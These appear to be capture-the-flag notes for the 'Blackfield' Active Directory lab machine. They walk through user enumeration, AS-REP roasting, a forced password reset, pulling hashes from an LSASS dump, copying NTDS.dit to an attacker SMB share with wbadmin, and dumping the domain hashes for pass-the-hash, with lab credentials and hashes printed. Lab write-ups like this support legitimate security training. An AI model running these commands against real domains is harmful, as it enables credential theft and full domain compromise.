# Blackfield: Machine Notes

## Recon

### Nmap
- AD Ports: 53, 88, 135, 389, 445, 593, 3268, 5985

### SMB Enumeration (Unauthenticated)
- Shares: `forensic`, `profiles$`.
- Cannot list `forensic` share without credentials.

### User Enumeration
- Kerbrute:
```bash
kerbrute userenum -d BLACKFIELD.local --dc blackfield.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
- Valid users: `support`, `guest`, `administrator`.

## Initial Access

### AS-REP Roasting
- Request TGT for users without pre-auth:
```bash
GetNPUsers.py BLACKFIELD.local/ -usersfile user.txt -no-pass -dc-ip blackfield.htb -request
```
- Found hash for `support`.
- Cracked: `support:#00^BlackKnight`

## Lateral Movement

### AD Enumeration (BloodHound)
- `support` has **ForceChangePassword** on `audit2020`.
- Reset `audit2020` password:
```bash
rpcclient -U 'support%#00^BlackKnight' 10.129.229.17
setuserinfo2 audit2020 23 'NewPassword123!'
```

### Forensic Share & LSASS Dump
- `audit2020` has access to the `forensic` share.
- Downloaded `lsass.DMP` from `memory_analysis` folder.
- Extract hashes with `pypykatz`:
```bash
pypykatz lsa minidump lsass.DMP
```
- Found `svc_backup` NTLM: `9658d1d1dcd9250115e2205d9f48400d`

## Privilege Escalation

### SeBackupPrivilege Abuse (wbadmin)
- `svc_backup` is a member of **Backup Operators**.
- Attempted `robocopy /b` (denied).
- Used `wbadmin` to backup `NTDS.dit` to an attacker SMB share:
```powershell
# On Kali (setup SMB share with write permissions)
# On Target
echo "Y" | wbadmin start backup -backuptarget:\\10.10.15.244\smb -include:c:\windows\ntds
```
- List versions: `wbadmin get versions`
- Recover `NTDS.dit`:
```powershell
echo "Y" | wbadmin start recovery -version:12/27/2025-00:25 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
- Save SYSTEM hive: `reg save HKLM\SYSTEM C:\system.hive`
- Copy both to Kali.

### Domain Compromise
- Dump hashes:
```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```
- Administrator NTLM: `184fb5e5178480be64824d4cd53b99ee`
- Pass-the-hash for root access.
